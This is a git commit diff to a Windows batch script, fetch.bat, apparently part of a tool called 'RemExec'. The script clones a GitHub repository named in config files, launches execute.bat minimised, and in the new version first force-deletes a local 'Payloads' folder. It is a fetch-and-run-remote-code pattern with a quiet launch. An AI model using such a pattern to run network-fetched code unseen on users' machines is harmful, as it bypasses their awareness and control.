f1d8cb09d616003bb05fc8c4d784bf0ae61933aa
GVIO <ampleevvlad11@gmail.com>
2024-11-01 21:04:54 +0200

    .

--- fetch.bat
+++ fetch.bat
@@ -1,6 +1,16 @@
 @echo off
 set /p user=<.\config\user.txt
 set /p repo=<.\config\repository.txt
-call git clone https://github.com/%user%/%repo%
-start /min execute.bat
-exit
+set /p folder=<.\config\folderName.txt
+
+
+if exist %folder%\ (
+  rmdir /s /q %localappdata%\Programs\RemExec\Payloads
+  call git clone https://github.com/%user%/%repo%
+  start /min execute.bat
+  exit
+) else (
+  call git clone https://github.com/%user%/%repo%
+  start /min execute.bat
+  exit
+)
